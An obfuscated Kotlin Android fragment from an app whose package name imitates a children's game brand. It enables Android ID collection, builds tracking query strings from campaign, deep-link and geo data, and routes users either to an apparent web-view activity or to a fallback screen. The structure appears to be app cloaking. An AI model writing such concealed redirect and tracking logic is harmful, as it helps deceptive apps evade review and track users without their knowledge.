package com.tocaboca.tocalifeworldt.teijw.wqwsa
import org.koin.android.ext.android.inject
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.ixjxhuzuhgy
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.jncxnjvjncxd
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.wpplslpslplpxlczx
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.jcjnjnx
import org.koin.core.qualifier.named


import androidx.fragment.app.Fragment
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.cgyxvhu
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.usususuididid
import android.content.Context
import android.view.LayoutInflater
import android.view.View
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.gdshudushuhuxhhuzc
import android.view.ViewGroup
import android.content.Intent
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.hijbokvojifdhuhuds
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.vokckvkod
import android.content.SharedPreferences
import com.tocaboca.tocalifeworldt.teijw.fdgf.Kwoowisadasx
import com.tocaboca.tocalifeworldt.teijw.nbhjgfh.Goxooziisudyygw

import android.os.Build
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.sokwdokkosdk
import android.os.Bundle
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.sokdokwkoko
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.splplwp
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.epww
import com.appsflyer.AppsFlyerLib
import com.tocaboca.tocalifeworldt.R
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.gokd
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.wplpq
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.suhadjisajiijxhuzuhhzxc
import com.tocaboca.tocalifeworldt.teijw.isdoko.Twiwiooosoxcs.uhxzhucjijjijijixcjiz



class Vowiwushd : Fragment() {
    private lateinit var siijwjiijs: Context
    val xjizij: SharedPreferences by inject(named("SharedPreferences"))



    override fun onAttach(context: Context) {
        super.onAttach(context)
        siijwjiijs = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.qpwoksijxuxczs, container, false)
    }

    override fun onStart() {
        super.onStart()
        val uxuizijcji = xjizij.getString(gdshudushuhuxhhuzc, null)
        val qppqlqlpokokosijx = xjizij.getString("deepSt", null)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val ucujixjiijd = xjizij.getString(gokd, null)
        val epwlplq = "com.tocaboca.tocalifeworldt"

        val nbbijkofkokd = Intent(activity, Goxooziisudyygw::class.java)
        val hciookxov = xjizij.getString(jncxnjvjncxd, null)
        val jcnxok = xjizij.getString(cgyxvhu, null)
        val hhfuuid = Build.VERSION.RELEASE

        val bjbijjiuvhd = xjizij.getString("mainId", null)
        val oekowkooqokoks = xjizij.getString(sokdokwkoko, null)
        val diijwijwkooksjidjix = xjizij.getString("appCamp", null)
        val sokekokowjishuadhu: String? = xjizij.getString(uhxzhucjijjijijixcjiz, null)
        val cxiivjjdv = Intent(activity, Kwoowisadasx::class.java)
        val sowkspdkoxkojcizhu = AppsFlyerLib.getInstance().getAppsFlyerUID(siijwjiijs)
        xjizij.edit().putString(sokwdokkosdk, sowkspdkoxkojcizhu).apply()

        val jjcjckx = "$hciookxov$splplwp$diijwijwkooksjidjix&$hijbokvojifdhuhuds$sowkspdkoxkojcizhu&$vokckvkod$bjbijjiuvhd&$usususuididid$epwlplq&$suhadjisajiijxhuzuhhzxc$hhfuuid&$wpplslpslplpxlczx$epww"
        val dokkow = "$hciookxov$hijbokvojifdhuhuds$ucujixjiijd&$vokckvkod$sokekokowjishuadhu&$usususuididid$epwlplq&$suhadjisajiijxhuzuhhzxc$hhfuuid&$wpplslpslplpxlczx$epww"
        val siadokokxkozcji = "$hciookxov$splplwp$qppqlqlpokokosijx&$hijbokvojifdhuhuds$sowkspdkoxkojcizhu&$vokckvkod$bjbijjiuvhd&$usususuididid$epwlplq&$suhadjisajiijxhuzuhhzxc$hhfuuid&$wpplslpslplpxlczx$wplpq"
        val fkookdsk = "$hciookxov$splplwp$qppqlqlpokokosijx&$hijbokvojifdhuhuds$ucujixjiijd&$vokckvkod$sokekokowjishuadhu&$usususuididid$epwlplq&$suhadjisajiijxhuzuhhzxc$hhfuuid&$wpplslpslplpxlczx$wplpq"

        when(oekowkooqokoks) {
            "1" ->
                if(diijwijwkooksjidjix!!.contains(ixjxhuzuhgy)) {
                    xjizij.edit().putString(jcjnjnx, jjcjckx).apply()
                    xjizij.edit().putString("WebInt", "campaign").apply()
                    startActivity(nbbijkofkokd)
                    activity?.finish()
                } else if (qppqlqlpokokosijx!=null||jcnxok!!.contains(uxuizijcji.toString())) {
                    xjizij.edit().putString(jcjnjnx, siadokokxkozcji).apply()
                    xjizij.edit().putString("WebInt", "deepLink").apply()
                    startActivity(nbbijkofkokd)
                    activity?.finish()
                } else {
                    startActivity(cxiivjjdv)
                    activity?.finish()
                }
            "0" ->
                if(qppqlqlpokokosijx!=null) {
                    xjizij.edit().putString(jcjnjnx, fkookdsk).apply()
                    xjizij.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(nbbijkofkokd)
                    activity?.finish()
                } else if (jcnxok!!.contains(uxuizijcji.toString())) {
                    xjizij.edit().putString(jcjnjnx, dokkow).apply()
                    xjizij.edit().putString("WebInt", "geo").apply()
                    startActivity(nbbijkofkokd)
                    activity?.finish()
                } else {
                    startActivity(cxiivjjdv)
                    activity?.finish()
                }
        }
    }







}
